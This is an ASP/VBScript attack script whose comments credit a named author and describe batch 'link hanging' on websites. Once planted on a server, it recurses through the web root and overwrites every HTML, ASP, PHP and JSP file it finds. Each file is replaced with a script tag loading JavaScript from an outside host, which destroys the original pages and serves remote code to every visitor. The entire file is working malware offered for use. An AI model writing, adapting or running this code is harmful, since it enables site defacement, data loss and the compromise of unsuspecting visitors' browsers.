<%@LANGUAGE = VBScript.Encode%>
<%
'网站自动批量挂链接 BY：神龙 QQ：29295842
data = Server.MapPath("\")  '网站路径
response.Write data
data2=""
dim names(20)
arrayValue = split(data,"\")
for i = 0 to UBound(arrayValue)
    data2 =data2+arrayValue(i)+"\"
    names(i)=data2
next

'-----for i=0 to UBound(names) '正向读取
int_url=UBound(names)
for i=0 to UBound(names)
iiint=int_url-i
url_data=names(iiint)
if url_data="" then
Response.Write ""
else
response.Write "</br>开始挂链接:</br>"
response.Write url_data
bianli(url_data) '遍历
end if
next
'txt_end_data2("C:\Program Files\小旋风AspWebServer\wwwroot\5.asp")
Response.Write "</br>写入完成</br>"


function txt_end_data2(abc)'写入文件尾部
dim fso  '读取文件
path=replace(abc,"\\","\")
'Response.Write path+"</br>"
str = "<script language=""javascript"" type=""text/javascript"" src=""http://www.36obuy.org/tj2.js""></script>"  '//写入内容
Set fso=CreateObject("Scripting.FileSystemObject")
set f=fso.CreateTextFile(path,1)
f.WriteLine str
f.Close
Response.Write "写入内容成功"+path+"<br>"
end function 

function bianli(path)'遍历目录
    set fso=server.CreateObject("scripting.filesystemobject")
    on error resume next
    set objFolder=fso.GetFolder(path)
    set objSubFolders=objFolder.Subfolders
    for each objSubFolder in objSubFolders
        nowpath=path + "\" + objSubFolder.name
        'Response.Write nowpath
        set objFiles=objSubFolder.Files
        for each objFile in objFiles
                data=nowpath+objFile.name
                if InStr(data,".html") or InStr(data,".HTML") or InStr(data,".htm") or InStr(data,".HTM") or InStr(data,".asp") or InStr(data,".aspx") or InStr(data,".php") or InStr(data,".jsp") then
        	    'Response.Write "<br>"
        	    'Response.Write data
                     txt_end_data2(data)'写入文件
    	end if
            next
            bianli(nowpath)'递归
    next
    set objFolder=nothing
    set objSubFolders=nothing
    set fso=nothing
end function 
 

%>